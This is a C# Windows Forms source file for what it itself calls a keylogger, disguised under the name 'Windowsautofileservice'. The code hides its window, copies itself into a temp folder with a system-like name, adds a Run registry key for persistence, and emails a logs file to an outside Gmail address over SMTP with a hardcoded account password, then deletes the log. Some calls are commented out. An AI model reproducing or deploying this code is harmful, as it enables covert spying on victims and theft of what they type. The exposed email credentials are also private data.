using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Mail;
using System.IO;
using Microsoft.Win32;
using System.Diagnostics;
namespace Windowsautofileservice
{
    public partial class Form1 : Form
    {
        string path_attachment;
        public Form1()
        {
            InitializeComponent();
        }
        private void StartWin()
        {
            if (!Directory.Exists(Path.GetTempPath() + "WindowsSystemDirectoryLogs"))
                Directory.CreateDirectory(Path.GetTempPath() + "WindowsSystemDirectoryLogs");
            if (!Directory.Exists(Path.GetTempPath()+ "WindowsSystemDirectorySetup"))
                Directory.CreateDirectory(Path.GetTempPath() + "WindowsSystemDirectorySetup");
            string src = AppDomain.CurrentDomain.BaseDirectory + "Windowsautofileservice.exe";

            string path = Path.GetTempPath() + @"WindowsSystemDirectorySetup\Windowsautofileservice.exe";
            if(!File.Exists(path))
                File.Copy(src, path);
            RegistryKey regkey = Registry.CurrentUser.OpenSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\\Run", true);
            if (regkey != null)
            {
                try
                {
                    regkey.SetValue("APIwindows", path);
                    string value = regkey.GetValue("APIwindows").ToString();
                }
               catch
                {
                    RegistryKey key = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\\Run");
                    key.SetValue("APIwindows", path);
                    key.Close();
                }
            }
        }
        private void sendEmailnet()
        {
            path_attachment = Path.GetTempPath() + @"WindowsSystemDirectoryLogs\logs.txt";
            string email = "huutuyen.adidaphat131420@gmail.com";
            MailAddress Send = new MailAddress("adidaphat0605@gmail.com", "UKP32");
            MailAddress Recieve = new MailAddress(email);
            MailMessage message = new MailMessage(Send, Recieve);
            message.Sender = new MailAddress("adidaphat0605@gmail.com", "UKP32");
            message.Subject = "Just Checking...";
            message.Body = "This is an automated email sent from Keylogger";
            System.Net.Mail.SmtpClient emailClient = new System.Net.Mail.SmtpClient();
            emailClient.UseDefaultCredentials = false;
            emailClient.Credentials = new System.Net.NetworkCredential("adidaphat0605@gmail.com", "anhyeuem1102");
            emailClient.Host = "smtp.gmail.com";
            emailClient.Port = 587;
            if (File.Exists(path_attachment))
            {
                System.Net.Mail.Attachment mailAttachment = new System.Net.Mail.Attachment(path_attachment);
                message.Attachments.Add(mailAttachment);
            }
            emailClient.EnableSsl = true;
            emailClient.Timeout = 20000;
            emailClient.Send(message);
            message.Dispose();
            File.Delete(path_attachment);
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            //StartWin();
            Process.Start(@"E:\Explorer Suite\CFF Explorer.exe");
            this.WindowState = FormWindowState.Minimized;
            this.ShowInTaskbar = false;
            this.Hide();
            timer_sendmail.Start();
        }
        #region//tao file nen zip
        /*
        private static void ZipLogDir(string sPath, string fileZip)
        {
            ZipOutputStream zipOut = new ZipOutputStream(File.Create(fileZip));
            foreach (string fName in Directory.GetFiles(sPath))
            {
                FileInfo fi = new FileInfo(fName);
                ZipEntry entry = new ZipEntry(fi.Name);
                FileStream sReader = File.OpenRead(fName);
                byte[] buff = new byte[Convert.ToInt32(sReader.Length)];
                sReader.Read(buff, 0, (int)sReader.Length);
                entry.DateTime = fi.LastWriteTime;
                entry.Size = sReader.Length;
                sReader.Close();
                zipOut.PutNextEntry(entry);
                zipOut.Write(buff, 0, buff.Length);
                zipOut.Password = "dkmdcm";
            }
            zipOut.Finish();
            zipOut.Close();
        }
        */
        #endregion
        private void timer_sendmail_Tick(object sender, EventArgs e)
        {
            #region
            /*
            logDirPath = Path.GetTempPath() + "Windows System Directory Logs";
            MessageBox.Show(logDirPath);
            if (logDirPath.EndsWith("\\"))
            {
                string temp = logDirPath.Remove(logDirPath.Length - 1, 1);
                ZipLogDir(logDirPath, temp + "_" + DateTime.Now.ToString("dd.MM.yyyy") + ".zip");
                logZipFilePath = string.Format(temp + "_" + DateTime.Now.ToString("dd.MM.yyyy") + ".zip");
            }
            else
            {

                ZipLogDir(logDirPath, logDirPath + "_" + DateTime.Now.ToString("dd.MM.yyyy") + ".zip");
                logZipFilePath = string.Format(logDirPath + "_" + DateTime.Now.ToString("dd.MM.yyyy") + ".zip");
            }
            foreach (string fName in Directory.GetFiles(logDirPath))
            {
                File.Delete(fName);
            }
            */
            #endregion
           // sendEmailnet();

        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            timer_sendmail.Stop();
        }
    }
}
